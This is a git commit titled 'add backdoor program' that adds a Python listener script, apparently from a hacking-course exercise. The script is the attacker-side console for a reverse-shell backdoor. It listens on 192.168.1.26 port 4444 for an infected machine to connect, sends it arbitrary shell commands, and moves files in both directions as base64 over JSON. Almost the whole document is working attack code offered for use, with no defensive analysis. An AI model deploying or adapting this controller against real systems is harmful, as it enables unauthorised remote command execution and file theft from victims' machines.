a7ee66c6d8d6b4b46759a33720f1256e56e2999d
Suhail <suhailsaifi7533@gmail.com>
2022-08-14 07:01:23 -0400

    add backdoor program

---
+++ backdoor_and_listener/listener.py
@@ -0,0 +1,62 @@
+#!/usr/bin/env python
+
+import socket, json, base64
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connection")
+        self.connection, address = listener.accept()
+        print("[+] Got the connection from " + str(address))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download File Successfull"
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def execute_remote(self, command):
+        self.reliable_send(command)
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+        return self.reliable_receive()
+
+    def run(self):
+        while True:
+            command = raw_input(">> ")
+            command = command.split(" ")
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+
+                result = self.execute_remote(command)
+
+                if command[0] == "download" and "[-] Error" not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error During Command Execution"
+            print(result)
+
+my_listener = Listener("192.168.1.26", 4444)
+my_listener.run()
